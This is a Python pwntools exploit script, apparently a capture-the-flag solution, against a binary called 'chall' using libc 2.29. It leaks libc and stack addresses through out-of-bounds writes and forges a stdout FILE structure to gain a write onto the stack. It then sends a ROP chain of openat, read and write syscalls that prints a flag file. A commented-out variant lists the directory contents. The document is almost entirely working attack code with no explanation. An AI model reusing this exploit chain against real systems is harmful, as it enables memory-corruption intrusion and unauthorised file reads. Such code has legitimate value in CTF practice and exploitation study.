from pwn import *
import codecs
libc = ELF('./libc-2.29.so')
while True:
	try:
		# p = process('./ez_file_2', env={"LD_PRELOAD": libc.path},aslr=True)
		p = process('./chall')
		# p = remote('188.166.177.88', 11102)
		p.sendlineafter(">", '1')
		# p.sendlineafter(":", str(0x1d0000)) # for local
		p.sendlineafter(":", str(0x200000))
		p.sendlineafter(":", "Zafir")
		offset_1 = 0x3e9771
		p.sendlineafter(">", '2')
		p.sendlineafter(":", str(offset_1))
		p.sendafter(":", b'\xf4')
		offset_2 = 0x3e9761
		sleep(0.5)
		p.sendline('2')
		sleep(0.5)
		p.sendline(str(offset_2))
		sleep(0.5)
		p.send_raw(b'\xf4')
		p.recvuntil('\x7f', timeout=0.5)
		libc_leak = int(codecs.encode(p.recvuntil('\x7f',
		timeout=0.5)[-6:][::-1], 'hex'), 16)
		p.recvuntil('\x7f')
		stack_leak = int(codecs.encode(p.recvuntil('\x7f')[-6:][::-1],
		'hex'), 16)
		print(hex(libc_leak))
		print(hex(stack_leak))
		libc_base = libc_leak - 0x1b0f3d
		# stack_base = stack_leak - 0x3007 # for local
		stack_base = stack_leak - 0x3004
		ret = libc_base + 0x52ffc
		stdin = libc_base + 0x1e4a00
		pop_rax = libc_base + 0x0000000000047cf7
		pop_rdx = libc_base + 0x000000000012bda6
		pop_rdi = libc_base + 0x00000000001950ed
		pop_rsi = libc_base + 0x000000000015a889
		pop_rcx = libc_base + 0x000000000011f72e
		syscall = libc_base + 0x0000000000139587
		mmap = libc_base + 0x0000000000117480
		AT_FDCWD = 0xffffffffffffff9c
		MAP_FIXED = 0x100
		dot = libc_base + 0x198bc0
		print(hex(pop_rax))
		offset_3 = 0x3e8a28
		p.sendlineafter(">", '2')
		p.sendlineafter(":", str(offset_3))
		p.sendafter(":", b'\x00')
		fake = p64(0xfbad208b) # _flags as they were before
		fake += p64(stdin) # _IO_read_ptr (needs to be a valid pointer)
		fake += p64(0) * 5 # _IO_read_end to _IO_write_end can all be 0
		fake += p64(stack_base) # _IO_buf_base, we are overwriting stdout
		fake += p64(stack_base + 0x9000) # _IO_buf_end, we can overwrite 0x2000 bytes
		fake = fake.ljust(0x84, b"\x00") # 0x84 byte padding to get to the next `fgets`
		p.sendafter(">", fake)
		# Getdents
		# rop = p64(pop_rax) + p64(257) + p64(pop_rdi) + p64(AT_FDCWD) +
		p64(pop_rsi) + p64(dot) + p64(pop_rdx) + p64(0) + p64(syscall)
		# rop += p64(pop_rax) + p64(78) + p64(pop_rdi) + p64(3) +
		p64(pop_rsi) + p64(stack_base) + p64(pop_rdx) + p64(0x400) + p64(syscall)
		# rop += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) +
		p64(pop_rsi) + p64(stack_base) + p64(pop_rdx) + p64(0x400) + p64(syscall)
		# p.send_raw(p64(ret)*900 + rop)
		# Read the flag
		flag_name = b"flag-19fcd7006243b983b7b70bc36315e9d6.txt\x00\x00\x00\x00\x00\x00\x00"
		rop = p64(pop_rax) + p64(257) + p64(pop_rdi) + p64(AT_FDCWD) + p64(pop_rsi) + p64(stack_base) + p64(pop_rdx) + p64(0) + p64(syscall)
		rop += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(stack_base) + p64(pop_rdx) + p64(0x50) + p64(syscall)
		rop += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(stack_base) + p64(pop_rdx) + p64(0x50) + p64(syscall)
		p.send_raw(flag_name + p64(ret)*900 + rop)
		p.interactive()
		p.close()

	except ValueError:

		p.close()
		continue
	except:
		break